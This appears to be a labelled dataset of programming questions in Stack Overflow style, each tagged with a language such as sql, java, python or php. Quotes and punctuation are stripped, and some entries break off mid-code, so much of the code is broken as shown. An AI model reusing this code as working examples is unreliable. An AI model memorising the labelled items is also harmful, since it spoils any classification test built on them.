row with the highest id  you have three fields id  date and total. your table contains multiple rows for the same day which is valid data however for reporting purpose you need to show only one row per day. the row with the highest id per day should be returned the rest should be hidden from users (not returned). to better picture the question below is sample data and sample output:   <pre><code>id  date  total 1  2011-12-22  50 2  2011-12-22  150 </code></pre>   the correct result is:   <pre><code>2  2012-12-22  150 </code></pre>   the correct output is single row for 2011-12-22 date and this row was chosen because it has the highest id (2>1),sql
fastest way to find an item in a sorted arraylist  in java  i have an arraylist with a list of objects. each object has a date field that is just a long data type. the arraylist is sorted by the date field. i want to insert a new object into the arraylist so that it appears in the correct position with regard to its date. the only solution i can see is to iterate through all the items and compare the date field of the object being inserted to the objects being iterated on and then insert it once i reach the correct position. this will be a performance issue if i have to insert a lot of records.    what are some possible ways to improve this performance  maybe an arraylist is not the best solution,java

best practice for hacking on a 3rd-party python module  i often find myself wanting to use a 3rd party python module in my own project  but i know that i will also need to make changes to the 3rd party module that i want to push upstream. what is the best practice of file layout/installation to achieve this     most python modules are laid out with root dir containing a  setup.py  to compile/install the module. the problem is  every time i make changes to the module source i need to re-run the full install step in order to use those changes in my project. for large modules  like scipy this can take some time.    alternatively  i can hack on the installed version of the python module  but then i have to manually move those changes back to the source version of the module in order to generate patches etc.    i know about virtualenv and pythonpath but they are ways of installing a module to a different location.    so far  i have manually created symlinks  but that is messy.,python

is this sql the most efficient way  we have a table that converts sat scores into act scores using a year. if the data changes in the future we would add the new scores along with the year the scores change. we need to pass in a year and sat score and return the correct act score.    sample data with three rows would be   <pre><code>act sat year 28 1010 1998 29 1010 2012 30 1010 2015 </code></pre>   if i pass in a sat score of 1010 and a year of 2014 i should return an act score of 29 back.    i wrote the following sql statement that works.     <pre><code>select act          rank() over(order by year desc)  from keessattbl  where sat = 1010 and int(year) &lt;= 2014  fetch first row only </code></pre>   is this the most efficient way to handle this.    thanks in advance doug,sql

selecting a date in the future  i am working on a shipment delivery report to determine if shipments are made within a shipment window.    every release has a ship_date value that is the date that the release must ship.  some releases though have a late window integer value that says if the shipment is made within x number of days then it is still considered on time.    this is complicated by another table which holds valid ship days for the month (used to exclude holidays  weekends  and such).   <pre><code>order_releases_table   part_no    quantity    ship_date    window  shipping_date   shipping_day </code></pre>   sample data   <pre><code>order_releases_table part_no  quantity  ship_date  window abc      100       9/1/2011   0 xyz      200       9/1/2011   2  shipping_date 9/1/2011 9/2/2011 9/5/2011 </code></pre>   so with this data part abc has to ship on 9/1 to be considered on time.  part xyz though can ship up to 2 days past 9/1 and still be considered on time  but since 9/3 isn t in our shipping days  then 9/5 is the last day it can ship and still be considered on time.    i think the answer lies in joining in a sub query of the shipping days table that assigns a row number to the shipping_day field.     <pre><code>select   row_number() over(order by shipping_date) as day_no    shipping_day from shipping_date where shipping_day &gt; ship_date  returns day_no  shipping_day 1       9/2/2011 2       9/5/2011 </code></pre>   then if i simply pick up the date where the day_no from this sub query is equal to window value from the release  i then have the last day a particular shipment can ship and still be considered on time.    i m having a hard time wrapping it all up in to the final query though.    is this the correct way to approach the problem,sql

loop until steady-state of a complex data structure in python  i have a more-or-less complex data structure (list of dictionaries of sets) on which i perform a bunch of operations in a loop until the data structure reaches a steady-state  ie. doesn t change anymore. the number of iterations it takes to perform the calculation varies wildly depending on the input.    i d like to know if there s an established way for forming a halting condition in this case. the best i could come up with is pickling the data structure  storing its md5 and checking if it has changed from the previous iteration. since this is more expensive than my operations i only do this every 20 iterations but still  it feels wrong.    is there a nicer or cheaper way to check for deep equality so that i know when to halt     thanks!,python

time module and file changes  i need to write a script that does the following    write a python script to list all of the files and directories in the current directory and all subdirectories that have been modified in the last x minutes. x should be taken in as a command-line argument. check that this argument exists  and exit with a suitable error message if it doesn’t. x should be an int which is less than or equal to 120. if not  exit with a suitable error message. for each of these files and directories  list the time of modification  whether it is a file or directory  and its size.    i have come up with this    <pre><code>#!/usr/bin/python   import os sys time  total = len(sys.argv)  if total &lt; 2:     print  you need to enter a value in minutes      sys.exit()  var =  int(sys.argv[1])   if var &lt; 1 or var &gt; 120 :     print  the value has to be between 1 and 120      sys.exit() past = time.time() - var * 60  result = []  dir = os.getcwd()   for p  ds  fs in os.walk(dir):     for fn in fs:         filepath = os.path.join(p  fn)           status = os.stat(filepath).st_mtime         if os.path.getmtime(filepath) &gt;= past:             size = os.path.getsize(filepath)             result.append(filepath)             created = os.stat(fn).st_mtime              asciitime = time.asctime( time.gmtime( created ) )              print  files that have changed are %s %(result)             print  size of file is %s %(size) </code></pre>   so it reports back with something like this   <pre><code>files that have changed are [ /home/admin/python/osglob2.py ] size of file is 729 files that have changed are [ /home/admin/python/osglob2.py    /home/admin/python/endswith.py ] size of file is 285 files that have changed are [ /home/admin/python/osglob2.py    /home/admin/python/endswith.py    /home/admin/python/glob3.py ] size of file is 633 </code></pre>   how can i get this to stop reepeating the files,python

in the constructor it gives me a null pointer exception.  this is the code for both the methods draw and input which are used to draw the grid.   <pre><code>        public void draw(integer[][] maze){     int x= 125;

global variable not being defined in a gibberish include  <strong><em>resume :</strong> i (php beginner) am having a problem where a <code>global variable</code> is not getting defined in a specific include <code>gator::display( main_filelist.php   $params)</code> that seems to be a function. others includes on the same don t have this problem. <strong>//</em></strong>    i m using a file manager called filegator on my website.    in this file manager there is file called <code>main.php</code> which is the page every users are on when they want to navigate through the folders or upload/download/manipulate files.    now this <code>main.php</code> file includes several others php files (for configurations  templates  tables...). also in this <code>main.php</code> file  at the very beggining of the file  i have a function that defines a <strong>global variable called $getprivileges</strong>.    part of <code>main.php</code> :   <pre><code>&lt;!-- determine user s permissions on current directory --&gt;  &lt; php     $directory = $_session[ cwd ];                  // current directory     $user = $_session[ simple_auth ][ username ];   // get username     $repository = gatorconf::get( repository );     // get base repertory of the file manager     $userdir = $repository.ds. user .ds.$user;      // user s repertory     $getprivileges = scandirectory($userdir  $directory);  function scandirectory($userdir =     $directory){     $folders = glob($userdir .  /*    glob_onlydir);     foreach($folders as $folder){         if (($folder == $directory &amp;&amp; gator::checkpermissions( r )) || (gator::checkpermissions( ru )) || ($userdir == $directory &amp;&amp; gator::checkpermissions( r ))) {             return true;         }          $scan_result = scandirectory($folder  $directory);          if($scan_result) {            return true;         }     }     return false; }  scandirectory($userdir  $directory);  if ((gator::checkpermissions( ru )) || ($userdir == $directory &amp;&amp;

php gator::display( main_filelist.php   $params) &gt;</code>    after some digging to find out the meaning of this gibberish (note that filegator doesn t provide advanced support any longer and that the ressources of the faq are limited in my problem) here are the informations i could gather to try solving this :    <code>gator::display()</code> looks to be a function defined in a file named file-gator.php  which is also the page that generates my <code>main.php</code> file (for instance if i am not logged in it can displays login.php instead). here is what i could find about <code>gator::display()</code> in this <code>file-gator.php</code> :   <pre><code>&lt; php&gt;     class gator {            public static function display($view  $params = null){                 require_once gatorconf::get( base_path ). /include/views/ .$view;            }     } &lt; &gt; </code></pre>   and here is a part of <code>main_filelist.php</code> so you can see what $params is used for :   <pre><code>&lt;table class= file-list &gt; &lt; php $i = 1; &gt;      &lt;tbody&gt;      &lt; php if(!empty($params[ dirs ])) foreach ($params[ dirs ] as $file): &gt;     &lt; php if (($file[ name ] ==  user ) &amp;&amp; ($_session[ cwd ] == gatorconf::get( repository ))): &gt;     &lt; php else: &gt;         &lt;tr class= directory &lt; php if ($file[ type ] ==  back ) echo  back-button ; &gt; &gt;            &lt; php if ($getprivileges == true):  &gt;             &lt; php if ($file[ type ] !=  back  &amp;&amp; $file[ type ] !=  user ): &gt;             &lt;td class= chkboxes &gt;&lt;input type= checkbox  name= &lt; php echo $i++; &gt;  value= &lt; php echo $file[ crypt ] &gt;  /&gt;&lt;/td&gt;             &lt;

&gt; </code></pre>   so it looks like the file main_filelist.php included on my main.php is included through a require_once function (<code>gatorconf::get( base_path )</code> is just the installation path of the file manager) exept this <code>require_once function</code> is apparently inside the function <code>public static function display</code> with a variable <code>$param</code> on top of the require_once...    i am positive that this is the reason why my variable does not work for the code being included by this function.    if i remplace <code>gator::display( main_filelist.php   $params)</code> by  <code>gator::display( main_filelist.php )</code> most of the code won t work.    but if i replace <code>gator::display( main_filelist.php   $params)</code> by a classic include <code>include( main_filelist.php )</code> then the most of the code is executed and i can actually see my variable <code>$getprivileges</code> being taken into account.   <ul> <li>why is my variable <code>$getprivileges</code> not working with this type of include   (debugging reports me that the variable is not defined for the code included by <code>gator::display( main_filelist.php   $params)</code> )</li> <li>how can i have my variable to work without changing the way it is included with the <code>$params</code>   (i am afraid to break the code and there is the possibility that i have to do it for another file in the future on which i may not have the choice)</li> </ul>   sorry for the lenght of this post  i am trying to give as much informations as possible and i m actually figuring a lot out by recapitulating this situation.    also  i am a beginner in php so feel free to give as much details as you want if you have some suggestions :s thanks a lot for your help !    -apatik    <strong>update :</strong>    i added this code on the <code>main-filelist.php</code> (the included file that wouldn t get my <code>$getprivilege</code> and so far it looks ok ! going to test every possibilities.   <pre><code>&lt;

how to remove instanceof for calling the correct method   i have the following hierarchy of classes:   <pre><code>public interface message public interface v2message extends message public interface v3message extends message </code></pre>   i defined another interface to validate a message.    <pre><code>public interface validation {   boolean validate(message message); } </code></pre>   each class that implements <code>validation</code> can deal with v2 and/or v3 messages  so in my implementation i have to distinguish the kind of message i want to validate because the code will be different.   <pre><code>public class myvalidation implements validation {   public boolean validate(message message) {     if(message instanceof v2message) {       return validatev2((v2message)message);     } else if (message instanceof v3message) {       return validatev3((v3message)message);     } } </code></pre>   i was wondering if there is a way to remove the use of <code>instanceof</code>.,java

when would you use object biginteger instead of simply using double   so i was given a problem telling me to make a table of factorials of integers up to number 30.  the book specifically tells me to use the object biginteger. (using biginteger big= biginteger.valueof(x)) however doing so is pretty tricky and gives me a bunch of errors that i have no idea how to fix.      for example    <pre><code>public static biginteger factorial(int a){         if(a == 0){             return biginteger.valueof(1);         }         else{             return biginteger.valueof(a*biginteger.valueof(factorial(a-1)));// this will keep giving me an error message that i need to change the value type to  long  and back and forth to biginteger.  i ve tried many different variations including where i use biginteger.valueof(..) to every values.         }      }   </code></pre>   do you know a correct way to use the biginteger object     when would you ever use biginteger instead of double    <pre><code>   import java.math.biginteger;         public class bigint {              public static double factorial(int a){                 if(a == 0){                     return 1;                 }                 else{                     return a* factorial(a-1);                 }              }             public static void table(int a){                 for(int i =0; i&lt;=a; i++){                     system.out.println(i +      + factorial(i) );                      }                 }              public static void main(string[] args) {             table(30);             }          } </code></pre>,java
3 php string questions <ol> <li>i have php searching in a text file for packages and then it prints back the information. i have a working script but it only works if the user types in the name of the package correctly and uses any captailization that the item has in the file. how can i make php less strict about this  like  a user spelling the word slightly wrong  or forgetting a  - .</li> <li>below is another script i m working on for getting information from a file. my objective is for the script to grab the first line and the third line  not the second. the file contents of the packages.txt look something like this:</li> </ol>  <blockquote> <pre><code> package name:  asdf  package size: 8k  package location:  www.asdf.com/asdf-package.html </code></pre> </blockquote>   at the moment  i m using this to gather that information  but it s simply not working with the first and third lines:   <pre><code>$data4 = file( www.asdf.com/packages.txt ); //the text file above  for ($i = 0  $found = false; isset($data4[$i]); $i++) { //$i is the counter. /*$package2 consists of the word searched and a constant string:  package name:  */ if (trim($data4[$i]) === $package2) {  $fdas = trim($data3[++$i]); //$fdas is going to hold the url info    echo ($find2); //$find2 is the original package name.    echo( &lt;br/&gt; ); //two breaks    echo( &lt;br/&gt; ); //the lines below handle making a link from a url and custom package location $finout = strstr($fdas   . ); // $secondfinout =  http://www.asdf.com/ .$finout; echo( &lt;a href= $secondfinout &gt;$secondfinout&lt;/a&gt; ); $found = true; break;  } } </code></pre>   the second step is script i m writing now. it doesn t work. i do have simpler ones that follow the same concept that do work  the only problem is the strstr($fdas  . ); puts a dot in the url. i had to start the string somewhere and leave out the parts that are not apart of the url and the dot seems to be my only choice  is there a way i can remove of it     thank you so much for any input  i understand this a lengthy question  so feel free to answer what you want of it. i should note that the php script is started by an javascript/html form and then the posts are passed to php. i am sure those all work right.    thank you.,php

scanning and manipulating strings cardinal directions  i am creating a directed graph that represents a maze. one of the mechanics in the maze is to flip the direction of nodes. i am just reading the nodes from a file and i want to change the direction of node so it is opposite. by direction i mean n w s etc. however  my function does not work when using the string from the scanner and returns null when doing a system out. but does work when putting in a made up string  for example string test =  e  and then test = flipdirection(test). this sets test to  w . so i know that the flipdirection function and the string compares are valid. the output for the first line is  e  and then null.    <pre><code>public digraph(){      filereader reader = null;     scanner scan = null;       try {         reader = new filereader( input.txt );         scan = new scanner(reader);         scan.nextline();          while(scan.hasnextline()){              //read in unflipped nodes             int row = scan.nextint();             int col = scan.nextint();             char color = scan.next().charat(0);             string circle = scan.next();             string direction = scan.nextline();               //add a node to the graph             vertex v1 = new vertex(row  col  color  circle  direction);             addnode(v1);              //add a flipped node             system.out.println(direction);             direction = flipdirection(direction);             system.out.println(direction);             vertex v2 = new vertex(row  col  color  circle  direction);             addnode(v2);           }       } catch (filenotfoundexception e) {         system.out.println(e.getlocalizedmessage());     }  }   public static string flipdirection(string d){      string flip = null;       if(d.equals( n ))         flip =  s ;     if(d.equals( s ))         flip =  n ;     if(d.equals( e ))         flip =  w ;     if(d.equals( w ))         flip =  e ;     if(d.equals( nw ))         flip =  se ;     if(d.equals( se ))         flip =  nw ;     if(d.equals( ne ))         flip =  sw ;     if(d.equals( sw ))         flip =  ne ;     return flip; }  public class vertex {    //name of vertex and a pointer to the first node in its adj linked list  public int row; public int col; public char color; public string direction; public string iscircle;   public vertex(int row  int col  char color  string iscircle  string direction) {     super();     this.row = row;     this.col = col;     this.color = color;     this.iscircle = iscircle;     this.direction = direction; }  @override public string tostring() {     return  vertex [row=  + row +    col=  + col +    color=  + color             +    direction=  + direction +    iscircle=  + iscircle +  ] ; } </code></pre>   and this is what the input file looks like  without the extra spaces. the direction is the last part of text in each line   <pre><code>7 7  1 1 r n e  1 2 b n w  1 3 b n nw  1 4 r n nw  1 5 r n s </code></pre>,java

is it necessary to validate function parameters or not   when i write down a function is a good practice to validate all the parameters of the function like this:   <pre><code>&lt; php /**  * foo - test function  *  * @param int $parama  * @param str $paramb  * @param array $paramc  *  * @return something  */ function foo($parama  $paramb  $paramc) {     // verify all parameters     if(!is_int($parama)) {         return 0; // or error msg     }     if(!is_string($paramb)) {         return 1; // or error msg     }     if(!is_array($paramc)) {         return 2; // or error msg     }      // some code in function scope that uses parameters      // and saves the results in $result     return $result; } </code></pre>   or should i rely on the user that will use the function and assume that he knows what he is doing and forget about parameter validation     personally i prefer to validate all the parameter of the function and return error codes for consistency of the code and make my life easier afterwords.    thank you in advance.,php

how to update a column value incrementally  i m experimenting with a personal finance application  and i m thinking about what approach to take to update running balances when entering a transaction in an account.    currently the way i m using involves retrieving all records more recent than the inserted/modified one  and go one by one incrementing their running balance.    for example  given the following transactions:    t1 date = 2008-10-21  amount = 500  running balance = 1000    t2 date = 2008-10-22  amount = 300  running balance = 1300    t3 date = 2008-10-23  amount = 100  running balance = 1400 ...    now suppose i insert a transaction between t1 and t2  then t2 and all subsequent transactions would need their running balances adjusted.    hehe  now that i wrote this question  i think i know the answer... so i ll leave it here in case it helps someone else (or maybe there s even a better approach )    first  i get the running balance from the previous transaction  in this case  t1. then i update all following transactions (which would include the new one):   <pre><code>update transactions set running_balance = running_balance + &lt;amount&gt; where date &gt; &lt;t1.date&gt; </code></pre>   the only issue i see is that now instead of storing only a date  i ll have to store a time too. although  what would happen if two transactions had the exact same date/time     ps: i d prefer solutions not involving propietary features  as i m using both postgresql and sqlite... although a postgre-only solution would be helpful too.,sql

should sql format the output or just retrieve the raw data   generally speaking  the sql queries that i write return unformatted data and i leave it to the presentation layer  a web page or a windows app  to format the data as required. other people that i work with  including my boss  will insist that it is more efficient to have the database do it. i m not sure that i buy that and believe that even if there was a measurable performance gain by having the database do it  that there are more compelling reasons to generally avoid this.    for example  i will place my queries in a data access layer with the intent of potentially reusing the queries whenever possible. given this  i ascertain that the queries are more likely to be able to be reused if the data remains in their native type rather than converting the data to a string and applying formatting functions on them  for example  formatting a date column to a dd-mmm-yyyy format for display. sure  if the sql was returning the dates as formatted strings  you could reverse the process to revert the value back to a date data type  but this seems awkward  for lack of a better word. furtehrmore  when it comes to formatting other data  for example  a machine serial number made up of a prefix  base and suffix with separating dashes and leading zeros removed in each sub field  you risk the possibility that you may not be able to correctly revert back to the original serial number when going in the other direction. maybe this is a bad example  but i hope you see the direction i am going with this...    to take things a step further  i see people write very complex sqls because they are essentially writing what i would call presentation logic into a sql instead of returning simple data and then applying this presentation logic in the presentation layer. in my mind  this results in very complex  difficult to maintain and more brittle sql that is less adaptable to change.    take the following real-life example of what i found in our system and tell me what you think. the rational i was given for this approach was that this made the web app very simple to render the page as it used the following 1-line snippet of classic ado logic in a classic asp web app to process the rows returned:   <pre><code>     ors.getstring (      &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;td style=  font-size:x-small   nowrap&gt;    &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;/tr&gt;  &amp; vbcrlf &amp;  &lt;tr&gt;  &amp; vbcrlf &amp; _       &lt;td style=  font-size:x-small   nowrap&gt;    &amp;nbsp;  ) &amp;  &lt;/td&gt;  &amp; vbcrlf &amp;  &lt;/tr&gt;  &amp; vbcrlf &amp; _ </code></pre>   here s the sql itself. while i appreciate the author s ability to write a complex sql  i feel like this is a maintenance nightmare. am i nuts  the sql is returning a list of programs that are current running against our database and the status of each:    because the sql did not display with cr/lfs when i pasted here  i decided to put the sql on an otherwise empty personal google site. please feel free to comment. thanks.    by the way-this sql was actually constructed using vb script nested within a classic asp page  not calling a stored procedure  so you have the additional complexity of embedded concatentations and quoted markup  if you know what i mean  not to mention lack of formatting. the first thing i did when i was asked to help to debug the sql was to add a debug.print of the sql output and throw it through a sql formatter that i just found. some of the formatting was lost in pasting at the following link:    edit(andomar): copied inline: (external link removed  thanks-chad)   <pre><code>select  substring(datename( dw  start_datetime) 1 3)  +      + cast(start_datetime as varchar)  start time (utc/gmt)   program_name  program name   run_sequence  run sequence   case  when batchno = 0 then char(160) when batchno = null then char(160) else cast(batchno as varchar) end  batch #  /*  replace(replace(detail_log   k:\    file://servernamehere/diskvolk/ )   \    / )  log */ /* */  cast( &lt;a href= gois_viewlog.asp program_name=  as varchar(99)) + cast(program_name as varchar) + cast( &amp;run_sequence=  as varchar) + cast(run_sequence as varchar) + cast( &amp;page=1  as varchar) +    + cast(  &gt;

java-reading a file  performance difference between byte and character streams  pretty simple question: what s the performance difference between a byte stream and a character stream     the reason i ask is because i m implementing level loading from a file  and initially i decided i would just use a byte stream for the purpose  because it s the simplest type  and  thus it should perform the best. but then i figured that it might be nice to be able to read and write the level files via a text editor instead of writing a more complex level editor (to start off with). in order for it to be legible by a text editor  i would need to use character streams instead of byte streams  so i m wondering if there s really any performance difference worth mentioning between the two methods  at the moment it doesn t really matter much since level loading is infrequent  but i d be interested to know for future reference  for instances where i might need to load levels from hard drive on the fly (large levels).,java
sorting an array in java with certain conditions  i have a class called athlete which is a sublass of human. in the class human i implement the interface comparable and use the method compareto in order to compare the ages of different athletes. in the athletes class i have an extra field called year which corresponds to the year the athlete started competing. in my main method in my program i have an arraylist that i add both athletes and humans. i would like to so that if an athlete is of the same age to sort according to the year the athlete started competing. i use instanceof to check in my class human if the instance is the object is of type athlete but after that i don t know how to get it to work.   <pre><code>    public int compareto(human other)     {          if(this instanceof athlete &amp;&amp; other instanceof athlete &amp;&amp; this.age == other.age){             return ;         }         return this.age - other.age;     } } </code></pre>,java

neither keylistener nor key bindings will handle multiple key events  i m trying to handle up to five concurrent keypressed events.    i have tried listening for keypressed and keyreleased events and adding/removing the keycodes from an arraylist respectively. this works for two keys  and sometimes three  however any more than that and no more keypressed events are registered until the keyreleased events occur for presently pressed keys:   <pre><code>import java.awt.event.keyevent; import java.awt.event.keylistener; import java.util.arraylist;  public class keyboardhandler implements keylistener { public static arraylist&lt;integer&gt; keys = new arraylist&lt;integer&gt;();  public void keytyped(keyevent e) {  }  public void keypressed(keyevent e) {      // system.out.println( key pressed:   + e.getkeycode());      if (!keys.contains((integer) e.getkeycode())) {         keys.add((integer) e.getkeycode());         // system.out.println( key added to keylist:   + e.getkeycode());     }   }  public void keyreleased(keyevent e) {     // system.out.println( key released:   + e.getkeycode());      if (keys.contains((integer) e.getkeycode())) {         keys.remove((integer) e.getkeycode());         // system.out.println( key removed from keylist:   + e.getkeycode());     } }  public static void handlekeyinput() { // i then go on to handle the items in the array list appropriately  //using this method that is called by a thread. </code></pre>   i arrived at the conclusion that this can t be anything to do with using the arraylist  so ended up looking into key binding. as i understand now  key binds are a much better way of handling key events. however  my problem remains  no more than three keys are ever registered as being pressed until the presently pressed keys are released:   <pre><code>import javax.swing.actionmap; import javax.swing.inputmap; import javax.swing.jcomponent; import javax.swing.keystroke;  import java.awt.event.actionevent; import java.awt.event.keyevent;  import javax.swing.abstractaction;  public class keybinding extends jcomponent{     public keybinding(){          inputmap im = this.getinputmap(when_in_focused_window);         actionmap am = getactionmap();          im.put(keystroke.getkeystroke(keyevent.vk_w  0  false)   w_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_w  0  true)   w_released );          im.put(keystroke.getkeystroke(keyevent.vk_a  0  false)   a_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_a  0  true)   a_released );          im.put(keystroke.getkeystroke(keyevent.vk_s  0  false)   s_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_s  0  true)   s_released );          im.put(keystroke.getkeystroke(keyevent.vk_d  0  false)   d_pressed );         im.put(keystroke.getkeystroke(keyevent.vk_d  0  true)   d_released );          am.put( w_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( w key is pressed );             }           });          am.put( w_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( w key is released );             }           });          am.put( a_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( a key is pressed );             }           });          am.put( a_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( a key is released );             }           });          am.put( s_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( s key is pressed );             }           });          am.put( s_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( s key is released );             }           });          am.put( d_pressed   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println( d key is pressed );             }           });          am.put( d_released   new abstractaction(){              public void actionperformed(actionevent e) {                 system.out.println(  key is released );             }           });     } } </code></pre>   i m running eclipse on a mac  could it be some os specific bug or am i doing something totally wrong  i ve only been studying java for a couple of weeks and this has me stumped. i hate asking non-specific questions and just posting blocks of code - it seems lazy of me  but i ve tried and failed to solve this myself - all help is massively appreciated.,java

calculate library fine (php)  so  here is the question (<a href= https://www.hackerrank.com/challenges/library-fine  rel= nofollow >https://www.hackerrank.com/challenges/library-fine</a>) i am trying to solve. to solve this  i created a simple function <code>calculatefine</code> and set the conditions to calculate the fine. what s the problem  then  well  when i run the code on my machine  everything seems fine  but hackerrank won t accept the code. i am new to php and concept of functions was a bit confusing for me  but i tried. below is my code:   <pre><code>&lt; php $_fp = fopen( php://stdin    r ); /* enter your code here. read input from stdin. print output to stdout */  $_a = explode(    fgets($_fp)); $_b = explode(    fgets($_fp));  // initialising variable $_fine =   ;  // calling function calculatefine($_a $_b);  // defining function function calculatefine($actualdate  $returndate)      {           // checking various conditions          if ($actualdate[0] &lt;= $returndate[0] &amp;&amp; $actualdate[1] == $returndate[1] &amp;&amp; $actualdate[2] == $returndate[2])               {                 $_fine = 0;                 echo $_fine;             }         elseif($actualdate[0] &gt; $returndate[0] &amp;&amp; $actualdate[1] == $returndate[1] &amp;&amp; $actualdate[2] == $returndate[2])             {                 $_late = $actualdate[0] - $returndate[0];                 $_fine = 15*$_late;                 echo $_fine;             }         elseif($actualdate[1] &gt; $returndate[1] &amp;&amp; $actualdate[2] == $returndate[2])             {                 $_late = $actualdate[1] - $returndate[1];                 $_fine = 500*$_late;                 echo $_fine;             }         elseif($actualdate[2] &gt; $returndate[2])                  {                 $_fine = 10000;                 echo $_fine;             }         else              {                  $_fine = 0;                 echo $fine;  // updated (this is the undefined variable causing error )             }     }  &gt; </code></pre>,php
how to stop logic in another method in java  my logic is basicly like that;   <pre><code>public static void main(string[] args) {      check( this is string );      system.out.println( logic continue );  }   private static void check(string text) {      if (text.equals( this is string )) {         system.out.println( true );     } else {         system.out.println( false );     } } </code></pre>   i want to check the logic in another method and if statement is  false  i dont want to return the calling method.    for example;    in  check  method  if strings are not equal  program/thread or something else must be finish and  logic continue  mustn t be written.    i want to use this logic in web service to check the headers. in doget and dopost super method. if headers are not correct  gives a custom exception and program does not continue by sub class.   <pre><code>thread.currentthread().stop(); </code></pre>   above code (therad.currentthread().stop()) does not working in sevlet.    can anybody know this methodology in a safe way      edit :    some people understand me wrong so i wanted to edit my question. below is what i want to do. i have servlets in dynamic web application. and all of these servlets extends mybaseservlet.    baseservlet.java   <pre><code>public class baseservlet extends httpservlet{  @override protected void doget(httpservletrequest httpservletrequest  httpservletresponse resp) throws servletexception  ioexception {      if(headerscheckhelpers.checkheaders(httpservletrequest){          //if this part is working  everthing fine  application does what it wants      }else{         // if this else block works  thread should be stopped and non-return the subclasses     } } </code></pre>   }    example sub servlet class   <pre><code>public class contextservlet  extends baseservlet{  @override protected void doget(httpservletrequest httpservletrequest  httpservletresponse httpservletresponse) {     super.doget(httpservletrequest  httpservletresponse);      //if headers are not correct  i want this part not working. super class should handle this. } </code></pre>   }    so again  if the logic is true or false  i want to stop process(i dont want to return subclass method).,java

second iteration doesn t work  the question i had to answer was:   <blockquote>    implement a function with signature   <pre><code>def expand_one_or(course_lists): </code></pre>       this function takes a list of lists of strings course_lists  and   modifies it as follows:       <ul>   <li> it finds the first list (call it lis) in course_lists in which  /  occurs. </li>   <li> it then finds the coordinate of the first  /  in lis (say i). </li>   <li> if lis[i-1] and lis[i+1] exist and are both courses  lis is replaced in course_lists with two new lists: a list identical to lis but with   lis[i] and lis[i+1] removed  and a list identical to lis but with   lis[i] and lis[i-1] removed. </li>   <li> otherwise  all that happens is that lis[i] is removed from lis. </li>   </ul>       for example  if course_lists is:   <pre><code>[ [ csc148h1    /    csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>       expand_one_or finds the first  /   and modifies course_lists to become   <pre><code>[ [ csc148h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]  [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>       and if we run expand_one_or a second time on the resulting list  we   get   <pre><code>[ [ csc148h1         csc165h1    /    csc148h1    ;    / ]  [ csc148h1         csc240h1    /    csc148h1    ;    / ] [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre> </blockquote>   the code i used to do this was:    <pre><code>c = [ [ csc148h1    /    csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] d = [[ csc148h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]  [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]] def expand_one_or(course_lists):     accumulator = []     k = 0     for lis in course_lists:         for i in range(len(lis)):             if lis[i] ==  /  and i != len(lis) and k == 0:                 if lis[i - 1].isalnum() and lis[i + 1].isalnum():                     k = 1                     list1 = lis[:i] + lis[(i + 2):]                     list2 = lis[i + 1:]                     accumulator.append(list1)                     accumulator.append(list2)                  else:                     lis.remove(lis[i])                     k = 1     return accumulator </code></pre>   this code functions for the first iteration but doesn t work for the second one.    so for example if we give the function a list like:   <pre><code>[ [ csc148h1    /    csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>   it should give the output    <pre><code>[[ csc148h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]  [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ]] </code></pre>   now if we put this output code in the function again it should give:    <pre><code>[ [ csc148h1         csc165h1    /    csc148h1    ;    / ]  [ csc148h1         csc240h1    /    csc148h1    ;    / ] [ csc150h1         csc165h1    /    csc240h1    /    csc148h1    ;    / ] ] </code></pre>   the problem is when i run the function for the first time it gives me the proper output. however when i run it for the second time it gives me:   <pre><code>[[ csc148h1         csc165h1    /    csc148h1    ;    / ]  [ csc240h1    /    csc148h1    ;    / ]] </code></pre>   and this is the wrong output.,python

different types of array declaration in java  what kind of deference / meaning between the underline declaration of array in java.   <pre><code>int[] touchme; </code></pre>   or   <pre><code>int touchme[]; </code></pre>   or   <pre><code>int[] touchme[]; </code></pre>,java
automatically apply getter and setter to new object variable  ok  lets say i have a really simple class i.e.:   <pre><code>class test(object):     pass </code></pre>   what i would like to do is to define some default setter and getter methods which are automatically applied to a new object member at creation time. in the example below a.x should always be uppercase  i.e.:   <pre><code>a = test() a.x =  foo  print a.x  &gt;&gt;&gt; foo </code></pre>   if i create <code>x</code> within the class i would get this behavior like this:   <pre><code>class test(object):     def __init__(self):         self._x =         @property     def x(self):         return self._x      @x.setter(self  string):         self._x = string.upper() </code></pre>   so is there any possibility to do this without defining setter and getter methods for each member    thank a lot.    edit: with creation time i meant the creation time of <code>a.x</code> not of the class instance.,python

opening file with java application automatically  i want to create my own file format for a particular kind of file. when someone downloads this file i want their system to know it should be opened with my application.    for example when i download a .doc file  my computer asks me whether i want to save the file or open it with open office. similarly  if that .doc file is sitting on my desktop  and i double click it  it automatically opens with the correct application.    i believe this has to do with associating the file extension with the application in the context of the underlying os.    can any one point me to some good resources about how to do this in java     thanks.    edit: sorry i want to clarify. is there a way i can have my application associate the file type with itself when it is installed     edit: found this... <a href= http://java.sun.com/developer/technicalarticles/j2se/desktop/jdic_assoc/  rel= nofollow >http://java.sun.com/developer/technicalarticles/j2se/desktop/jdic_assoc/</a> platform independent solution,java

